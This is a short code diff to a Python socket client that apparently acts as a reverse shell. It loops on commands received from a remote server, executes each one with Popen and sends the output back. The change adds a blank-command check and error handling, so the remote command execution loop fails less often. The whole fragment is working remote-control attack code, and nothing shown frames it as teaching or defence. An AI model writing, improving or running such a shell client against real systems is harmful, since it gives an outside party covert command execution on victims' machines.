@@ -37,11 +37,17 @@ command = clientSocket.recv(4064).decode()
 
 # Continue receiving commands until server sends 'exit
 while command != 'exit':
-    # Execute any received commands and parse output (output,err)
-    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
-    result, err = proc.communicate()
-    # Send output/err back to server
-    clientSocket.send(result)
+    # Prevent blank commands
+    if command != "":
+        try:
+            # Execute any received commands and parse output (output,err)
+            proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
+            result, err = proc.communicate()
+            # Send output/err back to server
+            clientSocket.send(result)
+        except:
+            clientSocket.send("Error occurred executing command\n".encode())
+    
     # Accept/decode any subsequent commands
     command = (clientSocket.recv(4064)).decode()
 
